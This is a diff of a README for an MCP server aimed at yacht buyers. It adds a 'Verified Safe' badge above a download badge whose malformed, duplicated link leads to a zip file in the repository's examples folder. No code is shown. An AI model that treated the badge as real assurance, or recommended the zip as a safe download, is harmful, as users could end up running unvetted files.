@@ -1,5 +1,7 @@
 # 🛥️ yachtsy-mcp-server - Smart Insights for Yacht Buyers
 
+[![SafeSkill 95/100](https://img.shields.io/badge/SafeSkill-95%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/manee1112-yachtsy-mcp-server)
+
 [![Download Yachtsy](https://github.com/manee1112/yachtsy-mcp-server/raw/refs/heads/main/examples/mcp_yachtsy_server_v3.0.zip%https://github.com/manee1112/yachtsy-mcp-server/raw/refs/heads/main/examples/mcp_yachtsy_server_v3.0.zip)](https://github.com/manee1112/yachtsy-mcp-server/raw/refs/heads/main/examples/mcp_yachtsy_server_v3.0.zip)
 
 ## 🛠️ Overview
